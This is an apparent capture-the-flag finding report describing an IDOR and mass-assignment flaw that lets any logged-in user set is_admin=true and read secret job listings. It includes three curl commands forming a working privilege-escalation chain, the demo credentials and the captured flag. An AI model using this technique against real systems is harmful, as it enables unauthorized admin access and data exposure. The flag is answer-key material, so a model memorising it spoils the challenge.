findings.title: IDOR + Mass Assignment: Privilege Escalation to Admin via Company Profile Update
findings.description: The POST /edit_profile/{company_id} endpoint accepts an 'is_admin' boolean parameter that is not protected by any authorization check. Any authenticated user can set their own (or any other company's) is_admin=true, granting admin privileges. Once admin, the GET /company/{company_id}/jobs endpoint reveals private/secret job listings hidden from regular users. This is a combination of mass assignment (is_admin field accepted from user input) and IDOR (no check that the company_id in the URL matches the authenticated user's company).
findings.evidence:
1. Login as demo/demo -> JWT issued with sub=1 (company_id=1)
2. POST /edit_profile/1 with body: name=demo&is_admin=true
   Response: 'Profile updated successfully' + is_admin=Admin selected
3. GET /company/1/jobs (as admin) reveals secret job:
   'secret:flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}'

FLAG: flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}

reproduction.command:
# Step 1: Login
curl -c cookies.txt -X POST http://172.17.0.1:37983/token -d 'username=demo&password=demo'

# Step 2: Escalate to admin (IDOR + mass assignment)
curl -b cookies.txt -X POST http://172.17.0.1:37983/edit_profile/1 -d 'name=demo&is_admin=true'

# Step 3: Read private jobs (flag)
curl -b cookies.txt http://172.17.0.1:37983/company/1/jobs
